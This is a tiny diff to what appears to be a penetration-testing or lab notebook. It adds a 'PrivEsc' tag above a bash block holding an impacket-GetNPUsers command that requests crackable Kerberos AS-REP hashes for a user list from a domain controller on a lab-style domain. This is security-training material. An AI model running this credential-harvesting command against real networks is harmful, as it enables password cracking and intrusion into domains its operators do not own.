@@ -1,3 +1,7 @@
+---
+tags:
+  - PrivEsc
+---
 
 ```bash
 impacket-GetNPUsers lol.local/ -usersfile valid_users.txt -format hashcat -dc-ip 10.10.111.10
